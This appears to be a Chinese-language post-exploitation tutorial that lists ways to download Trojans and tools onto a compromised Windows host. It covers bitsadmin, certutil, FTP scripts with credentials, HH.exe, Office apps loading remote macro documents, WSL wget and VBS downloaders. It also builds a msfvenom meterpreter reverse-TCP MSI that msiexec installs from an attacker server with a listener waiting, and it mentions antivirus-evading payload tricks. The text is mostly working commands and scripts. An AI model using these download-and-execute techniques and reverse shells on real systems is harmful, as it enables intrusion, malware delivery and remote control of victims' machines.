后渗透是指已对目标服务器有shell交互后的操作，通常包含权限维持、提权、内网渗透、一键拿域控。

本篇文章主要讲解后渗透准备工作——下载文件的方式，文件可以是木马、工具等等（任意文件皆可），为了方便演示，文件为test.txt。

## ****准备工作****

首先需要架设服务器，并把要下载的文件部署在服务器上，笔者用的服务器为Kali Linux架设，ip地址是192.168.1.103。

输入命令：service apache2 start //启动Apache

输入命令：vim /var/www/html/test/test.txt //创建文件（可以是木马、工具等任意文件）

![](https://image.3001.net/images/20200811/1597144671.png)

服务器端架设完成，准备工作就到这里，下文开始演示Windows除网页下载文件的一些方法。

## ****下载文件****

  * Bitsadmin

此命令只能下载文件到本地磁盘上。

使用方法：

### 第一种

    
    
    bitsadmin /transfer myjob1 /download /priority normal http://192.168.1.103/test/test.txt C:\Users\snowwolf\Desktop\test.txt

![](https://image.3001.net/images/20200811/1597144648.png)

### 第二种

    
    
    bitsadmin /rawreturn /transfer getfile http://192.168.1.103/test/test.txt C:\Users\snowwolf\Desktop\test.txt

![](https://image.3001.net/images/20200811/1597144610.png)

### 第三种

    
    
    bitsadmin /rawreturn /transfer getpayload http://192.168.1.103/test/test.txt C:\Users\snowwolf\Desktop\test.txt

### ![](https://image.3001.net/images/20200811/1597144587.png)第四种

    
    
    bitsadmin /transfer myDownLoadJob /download /priority normal "http://192.168.1.103/test/test.txt" "C:\Users\snowwolf\Desktop\test.txt"

支持的系统版本：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10

  * Certutil

Windows程序用于处理证书

使用方法：

    
    
    certutil.exe -urlcache -split -f http://192.168.1.103/test/test.exe test.exe

会将exe文件下载到当前目录

![](https://image.3001.net/images/20200811/1597144561.png)

支持的系统版本：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10

  * FTP

文件传输协议，Windows可以直接搭建FTP服务器，所以这里ip地址是Windows的ip

使用方法：

第一种方式——交互式下载

![](https://image.3001.net/images/20200811/1597144714.png)

这里笔者是将Windows既当服务器又当靶机，在现实情况中可以需要自己购买服务器来搭建FTP环境（肉鸡也可）

第二种方式——一句话

    
    
    echo open 192.168.1.104>ftp.txt&echo snowwolf>>ftp.txt&echo 123qwe>>ftp.txt&echo get /test.txt>>ftp.txt&echo quit>>ftp.txt&@ftp -s:ftp.txt

![](https://image.3001.net/images/20200811/1597144750.png)

第三种方式——脚本

编写脚本script.bat

    
    
    @echo off
    
    @set temp=C:\Users\snowwolf\Desktop\ftp.txt
    
    echo open 192.168.1.104>>%temp%
    
    echo snowwolf>>%temp%
    
    echo 123qwe>>%temp%
    
    echo get %1>>%temp%
    
    echo quit>>%temp%
    
    @ftp -s:%temp%
    
    del %temp%

输入命令：script.bat test.txt（要下载的文件）即可下载

![](https://image.3001.net/images/20200811/1597144796.png)

当然还可以改进一下

    
    
    @echo off
    
    @set temp=C:\Users\snowwolf\Desktop\ftp.txt
    
    echo open 192.168.1.104>>%temp%
    
    echo snowwolf>>%temp%
    
    echo 123qwe>>%temp%
    
    echo lcd %1>>%temp%
    
    echo get %2>>%temp%
    
    echo quit>>%temp%
    
    @ftp -s:%temp%
    
    del %temp%

这样就可以指定要下载的目录了，如script.bat C:\Users\snowwolf test.txt

![](https://image.3001.net/images/20200811/1597144837.png)

  * HH.exe

用于处理cmh文件格式的应用程序

使用方法：

    
    
    HH.exe http://192.168.1.103/test/test.txt

![](https://image.3001.net/images/20200811/1597144906.png)

有意思的是，它是以网页内容为显示，如果是其他格式文件可以直接下载

![](https://image.3001.net/images/20200811/1597144937.png)

支持的系统版本：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10

  * Excel.exe（想不到吧，我也能）

Office全家桶，不用多说

路径：

  * C:\ProgramFiles (x86)\Microsoft Office 16\ClientX86\Root\Office16\Excel.exe
  * C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Excel.exe
  * C:\Program Files (x86)\Microsoft Office\Office16\Excel.exe
  * C:\Program Files\Microsoft Office\Office16\Excel.exe
  * C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Excel.exe
  * C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Excel.exe
  * C:\Program Files (x86)\Microsoft Office\Office15\Excel.exe
  * C:\Program Files\Microsoft Office\Office15\Excel.exe
  * C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Excel.exe
  * C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Excel.exe
  * C:\Program Files (x86)\Microsoft Office\Office14\Excel.exe
  * C:\Program Files\Microsoft Office\Office14\Excel.exe
  * C:\Program Files (x86)\Microsoft Office\Office12\Excel.exe
  * C:\Program Files\Microsoft Office\Office12\Excel.exe
  * C:\Program Files\Microsoft Office\Office12\Excel.exe

Excel利用方法一般为宏病毒，这里笔者只简单写了个弹窗。先在Kali
Linux写个带有宏的Excel文档，然后在Windows主机上输入命令：EXCEL.EXE
http://192.168.1.103/test/test.xlsm

![](https://image.3001.net/images/20200811/1597144996.png)
![](https://image.3001.net/images/20200811/1597145017.png)

![](https://image.3001.net/images/20200811/1597145047.png)

不过这里要注意需要启用宏，笔者直接启用了

![](https://image.3001.net/images/20200811/1597145079.png)

当然也可以直接将木马程序直接分块添加，然后用脚本取值出来即可，也可以注入dll文件，一般杀软完全检测不到，要保存的话直接另存为就可以

既然有了Excel，当然也有POWERPNT.exe（就是ppt），目录位置一样

使用方法：

    
    
    POWERPNT.exe "http://192.168.1.103/test/test.pptx"

![](https://image.3001.net/images/20200811/1597145109.png)

这里笔者直接写了个图片马，另存改回格式即可，比Excel操作性更简单

既然PPT和Excel都有了，那WINWORD.exe也得有吧（就是word文档），操作同POWERPNT.exe一样，就不演示了

  * WLS.exe

适用于Windows的Linux子系统

路径：

    
    
    C:\Windows\System32

使用方法：

    
    
    WSL.exe --exec bash -c ‘wget http://192.168.1.103/test/test.txt’

注意：需要安装Windows子系统，应用商店就有，笔者喜欢装个Kali Linux，就是配置软件包得需要时间

支持的系统版本：Windows 10、Windows 19 Server

  * Msiexec.exe

系统进程，用于安装MSI，一般更新或者安装软件时会碰到，支持远程下载功能

使用方法：

先在Kali Linux端生成MSI文件，输入命令：

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.103 lport=7777 -f msi > test.msi

然后将文件移动到/var/www/html下![](https://image.3001.net/images/20200811/1597145266.png)

然后在MSF上开启监听，输入命令：

    
    
    msfconsle
    
    use exploit/multi/handler
    
    set payload windows/meterpreter/reverse_tcp
    
    set lhost 192.168.1.103
    
    set lport 7777
    
    run

![](https://image.3001.net/images/20200811/1597145306.png)

Windows端输入命令：msiexec.exe /q /i http://192.168.1.103/test.msi

![](https://image.3001.net/images/20200811/1597145345.png)

因为msiexec有下载执行的特性，所以Kali Linux会收到会话

![](https://image.3001.net/images/20200811/1597145378.png)

支持的系统版本：Windows vista、Windows 7、Windows 8、Windows 8.1、Windows 10

  * IPC$

Windows让进程间通信的开放的命名管道

Windows端用管理员权限打开cmd，输入命令：net share ipc$开启

![](https://image.3001.net/images/20200811/1597145452.png)

输入命令：

    
    
    net use \\192.168.1.104\ipc$ /user:snowwolf "123qwe"建立远程的IPC$连接

![](https://image.3001.net/images/20200811/1597145481.png)

输入命令：

    
    
    copy \\192.168.1.104\c$\Users\snowwolf\Desktop C:\Users\snowwolf

![](https://image.3001.net/images/20200811/1597145508.png)![](https://image.3001.net/images/20200811/1597145531.png)

即可远程拷贝成功

支持的系统版本：NT、Windows 2000、Windows XP及以上

  * VBS脚本

通过脚本也可以进行远程下载

使用方法：

第一种

编写脚本文件down.vbs

    
    
    iLocal = LCase(WScript.Arguments(1))
    
    iRemote = LCase(WScript.Arguments(0))
    
    Set xPost = CreateObject("Microsoft.XMLHTTP")
    
    xPost.Open "GET",iRemote,0
    
    xPost.Send()
    
    Set sGet = CreateObject("ADODB.Stream")
    
    sGet.Mode = 3
    
    sGet.Type = 1
    
    sGet.Open()
    
    sGet.Write(xPost.responseBody)
    
    sGet.SaveToFile iLocal,2

用cmd输入命令：cscript down.vbs http://192.168.1.103/test/test.txt

![](https://image.3001.net/images/20200811/1597145590.png)

第二种

编写脚本文件down1.vbs

    
    
    url = "http://192.168.1.103/test/test.txt"    '网络上的文件地址
    
    saveas = "C:\Users\snowwolf\Desktop\test.txt"                '保存成的本地文件
    
    Set xmlhttp = CreateObject("Microsoft.XMLHTTP") '创建HTTP请求对象
    
    Set stream = CreateObject("ADODB.Stream")       '创建ADO数据流对象
    
    Call xmlhttp.open("GET",url,False)'打开连接
    
    Call xmlhttp.send()'发送请求
    
    stream.mode = 3 '设置数据流为读写模式
    
    stream.type = 1     '设置数据流为二进制模式
    
    Call stream.open()'打开数据流
    
    Call stream.write(xmlhttp.responsebody)'将服务器的返回报文主体内容写入数据流
    
    Call stream.savetofile(saveas,2)'将数据流保存为文件
    
    '释放对象
    
    Set xmlhttp = Nothing
    
    Set stream = Nothing

输入命令：cscript down1.vbs即可进行下载

![](https://image.3001.net/images/20200811/1597145635.png)

第三种

编写脚本文件down2.vbs

    
    
    Set xPost = createObject("Microsoft.XMLHTTP")
    
    xPost.Open "GET","http://192.168.1.103/test/test.txt",0 '下载文件的地址
    
    xPost.Send()
    
    Set sGet = createObject("ADODB.Stream")
    
    sGet.Mode = 3
    
    sGet.Type = 1
    
    sGet.Open()
    
    sGet.Write(xPost.responseBody)
    
    sGet.SaveToFile "C:\Users\snowwolf\Desktop\test.txt",2 '保存文件的路径和文件名

输入命令：cscript down2.vbs即可下载

![](https://image.3001.net/images/20200811/1597145666.png)

## ****总结****

大概总结了这些方法，类似直接远程执行等没有添加，因为本文比较着重下载，下载PowerShell脚本也没有添加，想单独给PowerShell一个分支，后文将会持续更新后渗透系列。

